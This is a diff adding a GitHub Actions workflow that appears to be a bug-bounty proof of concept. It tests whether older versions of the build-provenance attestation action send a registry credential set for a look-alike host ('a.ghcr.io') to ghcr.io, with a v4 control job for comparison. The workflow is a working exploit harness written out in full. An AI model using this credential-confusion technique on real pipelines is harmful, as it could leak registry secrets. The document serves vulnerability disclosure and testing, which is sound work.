@@ -1,0 +1,41 @@
+name: att027b-ghcr-credential-confusion
+on:
+  push:
+    branches: [att027b]
+permissions:
+  contents: read
+  id-token: write
+  attestations: write
+jobs:
+  vulnerable-attest-v2:
+    runs-on: ubuntu-latest
+    steps:
+      - name: credential configured ONLY for the host a.ghcr.io (never for ghcr.io)
+        env:
+          GHCR_PASS: ${{ secrets.GHCR_PASS }}
+        run: |
+          mkdir -p ~/.docker
+          printf '{"auths":{"a.ghcr.io":{"auth":"%s"}}}' "$(printf 'HackerOne-Poc:%s' "$GHCR_PASS" | base64 -w0)" > ~/.docker/config.json
+          echo "credential keys: $(python3 -c 'import json,os;print(list(json.load(open(os.path.expanduser("~/.docker/config.json")))["auths"]))')"
+      - uses: actions/attest-build-provenance@v2
+        continue-on-error: true
+        with:
+          subject-name: ghcr.io/hackerone-poc/att027-img
+          subject-digest: sha256:cdb18deef49095b1abae1c03a8c6ca7a015942b63bd311057518491986d40283
+          push-to-registry: true
+  control-attest-v4:
+    runs-on: ubuntu-latest
+    steps:
+      - name: credential configured ONLY for the host a.ghcr.io (never for ghcr.io)
+        env:
+          GHCR_PASS: ${{ secrets.GHCR_PASS }}
+        run: |
+          mkdir -p ~/.docker
+          printf '{"auths":{"a.ghcr.io":{"auth":"%s"}}}' "$(printf 'HackerOne-Poc:%s' "$GHCR_PASS" | base64 -w0)" > ~/.docker/config.json
+          echo "credential keys: $(python3 -c 'import json,os;print(list(json.load(open(os.path.expanduser("~/.docker/config.json")))["auths"]))')"
+      - uses: actions/attest-build-provenance@v4
+        continue-on-error: true
+        with:
+          subject-name: ghcr.io/hackerone-poc/att027-img
+          subject-digest: sha256:cdb18deef49095b1abae1c03a8c6ca7a015942b63bd311057518491986d40283
+          push-to-registry: true
